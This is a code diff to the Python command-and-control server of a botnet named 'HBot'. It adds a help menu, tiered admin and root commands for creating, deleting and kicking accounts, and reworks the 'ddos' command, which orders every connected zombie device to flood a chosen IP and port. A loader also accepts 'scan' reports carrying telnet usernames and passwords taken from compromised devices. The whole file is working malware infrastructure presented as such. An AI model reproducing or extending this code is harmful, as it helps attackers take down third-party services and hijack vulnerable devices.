@@ -60,8 +60,8 @@ class Master(threading.Thread):
         self.send(f'\033]0;HBot | {title}\007')
 
     def clear_screen(self):
-        self.send('\033[2J\033[1H')
         self.bulk_send([
+            '\033[2J\033[1H',
             '',
             f'    {self.color.fade("╦.╦╔╗.╔═╗╔╦╗")}'.replace('.', f'{self.color.white}.'),
             f'    {self.color.fade("╠═╣╠╩╗║.║.║.")}'.replace('.', f'{self.color.white}.'),
@@ -111,25 +111,92 @@ class Master(threading.Thread):
             argument = cmd.split(' ')
             command = argument[0]
 
-            if command == 'clear':
-                self.clear_screen()
-
-            if command == 'method':
-                table = self.console.get_table_fade('Methods', '💥', ['http', 'syn', 'tcp_flood', 'dns', 'ntp', 'bypass', 'ovh'])
+            # Show only avaiable commands
+            if command == 'help': # ・>
+                table = self.console.raw_fade(self.console.get_custom_table(['📌 COMMAND', '📋 DESCRIPTION', '⭐ PERMISSION'], [
+                    'clear\nmethod\nlist\ncreate_acc\ndelete_acc\nkill',
+                    'Clean the screen\nSee attack methods\nSee connected users\nCreate an account\nDelete an account\nKick user from server',
+                    'all\nall\nadmin\nroot\nroot\nroot'
+                    ]))
                 self.bulk_send(table)
 
-            if command == 'ddos':
+            elif command == 'clear':
+                self.clear_screen()
+
+            elif command == 'method':
+                table = self.console.raw_fade(self.console.get_simple_table('METHOD', '💥', ['http']))
+                self.bulk_send(table)
+
+            elif command == 'ddos':
                 if len(argument) < 4:
-                    self.send('ddos <method> <ip> <port> <time>')
+                    self.send('Bad syntax: ddos <method> <ip> <port> <time>\n')
                 
                 else:
                     ip = argument[2]
                     port = argument[3]
-                    time = argument[4]
+                    timeout = argument[4]
                     method = argument[1]
 
                     for zombie in self.database.online_zombie:
-                        zombie.ddos_payload(ip, port, time, method)
+                        zombie.ddos_payload(ip, port, timeout, method)
+
+            # Admin command
+            elif self.grade not in ['root', 'admin']:
+                self.send(f'You are not allowed to use an {self.color.yellow}Admin{self.color.reset} command !\n')
+
+            elif command == 'list':
+                data = []
+
+                for user in self.database.online_user:
+                    data.append(f'User n°{self.color.magenta}{len(data) + 1}{self.color.reset} - Username: {self.color.yellow}{user.username}{self.color.reset} Grade: {self.color.green}{user.grade}{self.color.reset} Session-Time: {self.color.blue_m}{int(time.time()) - user.session_time}{self.color.reset}s')
+                
+                self.bulk_send(data)
+
+            # Root command
+            elif self.grade not in ['root']:
+                self.send(f'You are not allowed to use an {self.color.yellow}Root{self.color.reset} command !\n')
+            
+            # create_acc <user> <pass> <grade>
+            elif command == 'create_acc':
+                if len(argument) < 4:
+                    self.send(f'Bad syntax: create_acc <{self.color.orange}username{self.color.reset}> <{self.color.red}password{self.color.reset}> <{self.color.yellow}grade{self.color.reset}>\n')
+                
+                else:
+                    if self.database.create_user(argument[1], argument[2], argument[3]):
+                        self.send(f'The user has been successfully created\n')
+
+            elif command == 'delete_acc':
+                if len(argument) < 2:
+                    self.send(f'Bad syntax: delete_acc <{self.color.orange}username{self.color.reset}>\n')
+                
+                else:
+                    result = self.database.delete_user(argument[1])
+                    disconnected= 0
+
+                    if result:
+                        for user in self.database.online_user:
+                            if user.username == argument[1]:
+                                disconnected += 1
+                                user.kill(f'Account was deleted by {self.username}', True)
+
+                        self.send(f'The account has been successfully deleted, {disconnected} users have been kicked\n')
+                    else:
+                        self.send(f'Invalid account\n')
+
+            elif command == 'kill':
+                if len(argument) < 2:
+                    self.send(f'Bad syntax: kill <{self.color.orange}username username1 username2{self.color.reset}>\n')
+                
+                else:
+                    disconnected= 0
+
+                    for user in self.database.online_user:
+                        if user.username in argument:
+                            disconnected += 1
+                            user.kill(f'Kicked by {self.username}', True)
+                    
+                    self.send(f'{disconnected} users was successfully kicked\n')
+            
 
     def run(self):
         threading.Thread(target= self.loop_thread).start()
@@ -206,16 +273,16 @@ class Loader(threading.Thread):
                 return
 
             if '|' in data:
-                args = data.split('|')
-                req_type = args[0]
+                argument = data.split('|')
+                req_type = argument[0]
                 
                 # scan|127.0.0.1|23|user|pass|telnet 
                 if req_type == 'scan':
-                    ip = args[1]
-                    port = args[2]
-                    username = args[3]
-                    password = args[4]
-                    device_type = args[5]
+                    ip = argument[1]
+                    port = argument[2]
+                    username = argument[3]
+                    password = argument[4]
+                    device_type = argument[5]
 
                     # Due to bug :c, 
                     if device_type == 'telnetscan':
@@ -342,7 +409,7 @@ class Handler(threading.Thread):
         threading.Thread(target= self.zombie_thread, args= (zp, zl,)).start()
 
 if __name__ == '__main__':
-    Database = database.Database('mongodb+srv://......')
+    Database = database.Database('mongodb+srv://....')
     Console = console.Console()
     Color = console.Color()
 
